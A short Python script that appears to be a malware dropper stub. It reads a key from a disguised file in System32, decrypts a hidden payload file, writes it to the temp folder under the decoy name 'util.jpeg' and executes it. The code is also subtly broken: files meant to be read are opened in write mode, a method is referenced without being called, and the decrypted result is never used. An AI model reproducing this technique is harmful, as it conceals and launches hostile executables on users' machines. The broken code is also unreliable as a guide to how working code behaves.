from cryptography.fernet import Fernet
import os
keysave = open("C:\Windows\System32\BMR", "w")
key = keysave.read
f= Fernet(key)
exe = open("C:\Windows\System32\SYSREG", "w")
decrypted=f.decrypt(exe)
exew=open("%temp%/util.jpeg", "w")
exew.write(exe)
os.system("start util.jpeg")